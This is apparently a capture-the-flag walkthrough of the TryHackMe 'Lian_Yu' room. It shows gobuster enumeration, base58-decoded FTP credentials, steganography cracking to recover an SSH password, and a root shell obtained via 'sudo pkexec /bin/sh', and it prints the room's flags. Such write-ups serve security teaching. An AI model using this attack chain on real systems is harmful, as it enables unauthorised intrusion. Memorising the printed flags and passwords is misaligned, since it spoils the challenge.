# Lian_Yu

A beginner level security challenge

Room URL: https://tryhackme.com/room/lianyu

---

# Task 1

1. Deploy the VM and Start the Enumeration.

No answer needed

2. What is the Web Directory you found?

Running gobuster shows an `/island` directory and running gobuster against that
shows a `/2100` directory

```bash
$ gobuster dir -w ~/projects/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.252.43/
/island (Status: 200)
$ gobuster dir -w ~/projects/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.252.43/island/
/2100 (Status: 200)
```

The source of `/island` hints at something being `vigilante` which could be a
username/password.

```
2100
```

3. What is the file name you found?

The source of the `/island/2100` page hints at a file extension: `.ticket`.
Running gobuster against this directory with this specific file extension
returns a file:

```bash
$ gobuster dir -w ~/projects/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.252.43/island/2100 -x "ticket"
/green_arrow.ticket (Status: 200)
```

4. What is the FTP Password?

The contents of the`/green_arrow.ticket` file has some encoded string. By using
[cyberchef](https://tinyurl.com/yb3fevmw) I was able to deduce that the string
is base58 encoded.

```
!#th3h00d
```

5. What is the file name with SSH password?

By using the `vigilante` username and the password of the previous question I am
able to log in to the ftp server. There are several files in the homedir of
vigilante. I've downloaded them to my machine. I also noticed a homedir of the
user `slade`. Running `stegcracker` against one of the downloaded files `aa.jpg`
with the `rockyou.txt` wordlist reveals there's a password `password`. Running
`steghide` with that password reveals a file called `ss.zip`. This file contains
two files: `passwd.txt` and `shado`. The latter actually contains a password.

```
shado
```

6. user.txt

The password in the `shado` file doesn't help us authenticate against the
vigilante user with SSH. It does allow access to the `slade` user though, and in
their homedir there's the user.txt flag.

```
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
```

7. root.txt

`sudo -l` reveals we can use `/usr/bin/pkexec`, so let's just run
`sudo /usr/bin/pkexec /bin/sh`

```bash
slade@LianYu:~$ sudo /usr/bin/pkexec /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
root.txt
# cat root.txt
```

And there's the flag!

```
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
```
